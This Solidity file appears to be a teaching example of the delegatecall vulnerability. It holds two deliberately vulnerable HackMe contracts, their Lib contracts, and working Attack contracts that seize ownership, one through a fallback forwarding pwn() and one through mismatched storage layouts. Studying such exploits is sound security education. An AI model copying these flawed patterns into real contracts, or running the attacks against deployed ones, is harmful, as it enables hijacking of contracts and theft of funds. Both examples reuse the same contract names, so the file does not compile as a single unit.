
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;


/**Note:

  Vulnerability
  - delegatecall is tricky to use and wrong usage or incorrect understanding can lead to devastating results.

  You must keep 2 things in mind when using delegatecall

  - delegatecall preserves context (storage, caller, etc...)
  - storage layout must be the same for the contract calling delegatecall and the contract getting called
 */


/*
  HackMe is a contract that uses delegatecall to execute code.
  It it is not obvious that the owner of HackMe can be changed since there is no
  function inside HackMe to do so. However an attacker can hijack the
  contract by exploiting delegatecall. Let's see how.

  1. Alice deploys Lib
  2. Alice deploys HackMe with address of Lib
  3. Eve deploys Attack with address of HackMe
  4. Eve calls Attack.attack()
  5. Attack is now the owner of HackMe

  What happened?
  Eve called Attack.attack().
  Attack called the fallback function of HackMe sending the function
  selector of pwn(). HackMe forwards the call to Lib using delegatecall.
  Here msg.data contains the function selector of pwn().
  This tells Solidity to call the function pwn() inside Lib.
  The function pwn() updates the owner to msg.sender.
  Delegatecall runs the code of Lib using the context of HackMe.
  Therefore HackMe's storage was updated to msg.sender where msg.sender is the
  caller of HackMe, in this case Attack.
*/

contract Lib {
  address public owner;

  function pwn() public {
    owner = msg.sender;
  }
}

contract HackMe {
  address public owner;
  Lib public lib;

  constructor(Lib _lib) {
    owner = msg.sender;
    lib = Lib(_lib);
  }

  fallback() external payable {
    address(lib).delegatecall(msg.data);
  }
}

contract Attack {
  address public hackMe;

  constructor(address _hackMe) {
    hackMe = _hackMe;
  }

  function attack() public {
    hackMe.call(abi.encodeWithSignature("pwn()"));
  }
}

/*
This is a more sophisticated version of the previous exploit.

1. Alice deploys Lib and HackMe with the address of Lib
2. Eve deploys Attack with the address of HackMe
3. Eve calls Attack.attack()
4. Attack is now the owner of HackMe

What happened?
Notice that the state variables are not defined in the same manner in Lib
and HackMe. This means that calling Lib.doSomething() will change the first
state variable inside HackMe, which happens to be the address of lib.

Inside attack(), the first call to doSomething() changes the address of lib
store in HackMe. Address of lib is now set to Attack.
The second call to doSomething() calls Attack.doSomething() and here we
change the owner.
*/

contract Lib {
    uint public someNumber;

    function doSomething(uint _num) public {
        someNumber = _num;
    }
}

contract HackMe {
    address public lib;
    address public owner;
    uint public someNumber;

    constructor(address _lib) {
        lib = _lib;
        owner = msg.sender;
    }

    function doSomething(uint _num) public {
        lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _num));
    }
}

contract Attack {
  // Make sure the storage layout is the same as HackMe
  // This will allow us to correctly update the state variables
  address public lib;
  address public owner;
  uint public someNumber;

  HackMe public hackMe;

  constructor(HackMe _hackMe) {
    hackMe = HackMe(_hackMe);
  }

  function attack() public {
    // override address of lib
    hackMe.doSomething(uint(uint160(address(this))));
    // pass any number as input, the function doSomething() below will
    // be called
    hackMe.doSomething(1);
  }

  // function signature must match HackMe.doSomething()
  function doSomething(uint _num) public {
    owner = msg.sender;
  }
}